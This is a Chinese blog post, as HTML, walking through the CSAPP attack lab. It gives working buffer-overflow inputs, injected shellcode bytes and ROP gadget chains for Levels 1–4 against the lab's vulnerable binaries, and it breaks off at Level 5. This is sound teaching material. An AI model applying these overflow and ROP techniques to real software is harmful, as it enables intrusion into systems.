@@ -1,0 +1,1250 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Mcginn">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Mcginn">
+    
+    <meta name="keywords" content="hexo,mcginn,mcginn7,ICPC,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>CSAPP - attacklab · Mcginn&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("../../../../font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="../../../../css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="../../../../css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="../../../../assets/m.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="../../../../scripts/main.js" as="script">
+    <link rel="preload" as="font" href="../../../../font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="../../../../index.html" >Mcginn&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">CSAPP - attacklab</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Mcginn's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(../../../../intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            CSAPP - attacklab
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.5k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/02/19</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "../../../../lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="../../../../assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li><p>在这个实验中，学习利用<strong>缓存溢出（buffer overflow）</strong>来改变程序的行为，即完成攻击者的目的效果。</p>
+</li>
+<li><p>需要掌握 x86-64 的栈和参数传递机制，其结构如下图所示。</p>
+<img src="/2020/02/19/CSAPP-attacklab/stack.png" title="[图 1. 通用栈帧结构]">
+<p>其中函数 P 调用了函数 Q，<strong>返回地址</strong>为函数 P 调用位置的下一条指令。实验攻击均修改该返回地址来完成攻击目的。</p>
+</li>
+</ul>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实验中的程序 CTARGET 和 RTARGET 都调用了函数 test：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数 test 又调用了函数 getbuf：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数 Gets 从标准输入读取输入。</p>
+<p>函数 Gets 没有进行边界检查，因此是不安全。</p>
+<p>数组 buf 是局部变量，存储于栈上，因而通过输入可以修改栈上数据达到攻击目的。</p>
+<p>BUFFER_SIZE 是个常量，使用 <code>gdb ctarget</code> 和 <code>disas getbuf</code> 可查看其大小（在本实验中，BUFFER_SIZE = 0x28）。</p>
+<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><p>针对程序 CTARGET， 修改函数 test 调用 getbuf 的返回地址，使其返回 touch1 函数而非 test。</p>
+<h4 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h4><p>使用 <code>disas touch1</code> 查看函数 touch1 的地址为 <strong>0x4017c0</strong>。</p>
+<p>使用 <code>disas getbuf</code> 查看汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x4017a8 &lt;+0&gt;:     sub    $0x28,%rsp</span><br><span class="line">0x4017ac &lt;+4&gt;:     mov    %rsp,%rdi</span><br><span class="line">0x4017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">0x4017b4 &lt;+12&gt;:    mov    $0x1,%eax</span><br><span class="line">0x4017b9 &lt;+17&gt;:    add    $0x28,%rsp</span><br><span class="line">0x4017bd &lt;+21&gt;:    retq</span><br></pre></td></tr></table></figure>
+<p>当读入字符串超过 40 时，依据栈帧结构，第 41~48 个字节即为返回地址，因此将其设置为 touch1 的地址即可。</p>
+<p>实验工具包提供了 hex2raw 将字节码（十六进制）转换成字符串，输入字节为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>使用 hex2raw 转换字节码序列：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; bytes &gt; args.txt</span><br><span class="line">./ctarget -q -i args.txt</span><br></pre></td></tr></table></figure>
+<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><h4 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h4><p>针对程序 CTARGET， 修改函数 test 调用 getbuf 的返回地址，使其返回 touch2 函数而非 test。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;		<span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="做法-1"><a href="#做法-1" class="headerlink" title="做法"></a>做法</h4><p>使用 <code>disas touch2</code> 查看函数 touch2 的地址为 <strong>0x4017ec</strong>。</p>
+<p>函数 touch2 需要传递参数 val，该参数的值等于实验工具包中 cookie.txt 保存值（在本实验中 <strong>cookie=0x59b997fa</strong>）。</p>
+<p>函数的参数传递先使用 6 个寄存器，更多的参数保存在栈中。前 6 个寄存器如下图所示：</p>
+<img src="/2020/02/19/CSAPP-attacklab/register.png" title="[图 2. 传递函数参数的寄存器]">
+<p>第一个参数寄存器为 %rdi，因此需要注入执行代码将 cookie 值保存到寄存器 %rdi 中。</p>
+<p>首先<strong>执行代码本质</strong>上是字节序列，其次返回地址指向下一条指令的地址，最后 CTARGET 的堆栈位置每次运行都保持一致。利用这三条性质可将返回地址指向栈的某个位置，并在该位置填入合法的指令字节序列，注入攻击代码。</p>
+<p><strong>A. 查看数组 buf 在栈上的保存位置。</strong></p>
+<p>使用 <code>b getbuf</code> 在函数 getbuf 的第一条指令设置断点，然后使用 <code>n 2</code> 执行一下两条指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x4017a8 &lt;+0&gt;:     sub    $0x28,%rsp</span><br><span class="line">0x4017ac &lt;+4&gt;:     mov    %rsp,%rdi</span><br></pre></td></tr></table></figure>
+<p>此时 %rdi = %rsp，为函数 Gets 的参数 buf，因此输入字符串的起始地址等于 %rsp。</p>
+<p>使用 <code>print /x $rsp</code> 查看 %rsp 的值为 0x5561dc78，即 CTARGET 每次运行时 buf 的地址都是 0x5561dc78。</p>
+<p><strong>B. 生成注入代码的字节序列。</strong></p>
+<p>与 Level 1 类似，用 0x5561dc78 覆盖 getbuf 的返回地址，然后从 0x5561dc78 开始填充注入代码：保存 cookie 值到 %rdi，然后跳转执行 touch2，其汇编代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">push $0x4017ec			# 填充 touch2 作为新返回地址</span><br><span class="line">retq					# 跳转到 touch2</span><br></pre></td></tr></table></figure>
+<p>将上述代码保存为 exec.s，使用以下命令查看指令字节序列：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c exec.s</span><br><span class="line">objdump -d exec.o</span><br></pre></td></tr></table></figure>
+<p>指令字节序列为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
+<p><strong>C. CTARGET 的输入字节序列</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><h4 id="要求-2"><a href="#要求-2" class="headerlink" title="要求"></a>要求</h4><p>针对程序 CTARGET， 修改函数 test 调用 getbuf 的返回地址，使其返回 touch3 函数而非 test。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;		<span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中，touch3 会调用函数 hexmatch 以比较输入字符串是否和 cookie 的字符串相同，新的函数会使用并覆盖栈上的数据。</p>
+<h4 id="做法-2"><a href="#做法-2" class="headerlink" title="做法"></a>做法</h4><p>在该实验中需要将 cookie 的字符串保存到栈上，并将其起始地址保存到 %rdi 上。</p>
+<p>解法和 Level 2 类似，但要注意一点，touch3 中的 hexmatch 会使用栈而破坏输入的字节序列，导致 cookie 的字符串序列无效。</p>
+<p>为了避免上述情况发生，与新函数执行相同，先开辟一段新的栈区以保护输入序列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea -24(%rsp), %rdi			# cookie 字符串地址</span><br><span class="line">sub $0x30, %rsp				# 开辟栈区</span><br><span class="line">push $0x4018fa				# touch3 地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>使用 <code>gcc -c exec.s</code> 和 <code>objdump -d exec.o</code> 查看指令字节序列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exec.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 8d 7c 24 e8          lea    -0x18(%rsp),%rdi</span><br><span class="line">   5:   48 83 ec 30             sub    $0x30,%rsp</span><br><span class="line">   9:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   e:   c3                      retq</span><br></pre></td></tr></table></figure>
+<p>CTARGET 的输入字节序列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 8d 7c 24 e8 48 83 ec</span><br><span class="line">30 68 fa 18 40 00 c3 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><h4 id="要求-3"><a href="#要求-3" class="headerlink" title="要求"></a>要求</h4><p>针对程序 RTARGET，修改函数 test 调用 getbuf 的返回地址，使其返回 touch2 函数而非 test。</p>
+<p>在该实验中，禁止执行栈中的指令，并且栈的地址也会发生变化。因此，Level 1~3 的做法失效了。</p>
+<h4 id="做法-3"><a href="#做法-3" class="headerlink" title="做法"></a>做法</h4><p>在该实验中通过找出已有指令的字节序列作为<strong>工具片段（gadget）</strong>，其原理如下图所示。通过工具片段来解决无法执行栈中指令的问题。</p>
+<img src="/2020/02/19/CSAPP-attacklab/gadget.png" title="[图 3. 工具片段的执行序列]">
+<p>每个工具片段以 ret(编码 0xc3) 结尾，将工具片段地址保存在栈上，ret 依次解栈来执行下一条工具片段。</p>
+<p>该实现限制了指令集 movq, popq, ret 和 nop。</p>
+<p>该实验的思路比较清晰：通过 popq 从栈中取数据，然后使用将数据保存到相应的寄存器（如 %rdi）即可。</p>
+<p>使用 <code>disas /r getval_142</code> 依次查看每个工具函数的指令序列。</p>
+<p>其中，关键的工具函数有 addval_273 和 addval_219：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function addval_273:</span><br><span class="line">   0x4019a0 &lt;+0&gt;:     8d 87 48 89 c7 c3       lea ,%eax</span><br><span class="line">   0x4019a6 &lt;+6&gt;:     c3      retq</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function addval_219:</span><br><span class="line">   0x4019a7 &lt;+0&gt;:     8d 87 51 73 58 90       lea -0x6fa78caf(%rdi),%eax</span><br><span class="line">   0x4019ad &lt;+6&gt;:     c3      retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>在 addval_273 中可以提取指令序列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x4019a2: 48 89 c7		movq %rax, %rdi</span><br><span class="line">0x4019a5: c3			retq</span><br></pre></td></tr></table></figure>
+<p>在 addval_219 中可以提取指令序列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x4019ab: 58			popq %rax</span><br><span class="line">0x4019ac: 90			nop</span><br><span class="line">0x4019ad: c3			retq</span><br></pre></td></tr></table></figure>
+<p>显然，通过工具片段 0x4019ab 提取 cookie 到 %rax，然后使用 0x4019a2 将 cookie 转移到 %rdi，完成参数构造。</p>
+<p>RTARGET 的输入字节序列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><h4 id="要求-4"><a href="#要求-4" class="headerlink" title="要求"></a>要求</h4><p>针对程序 RTARGET，修改函数 test 调用 getbuf 的返回地址，使其返回 touch3 函数而非 test。</p>
+<p>在该实验中，禁止执行栈中的指令，并且栈的地址也会发生变化。因此，Level 1~3 的做法失效了。</p>
+<h4 id="做法-4"><a href="#做法-4" class="headerlink" title="做法"></a>做法</h4><p>做法与 Level 4 类似，但是需要更多的工具片段，额外需要一条 lea 指令计算 cookie 字符串的地址。</p>
+<p>关键工具函数及提取的工具片段如下，函数顺序表示了执行顺序：</p>
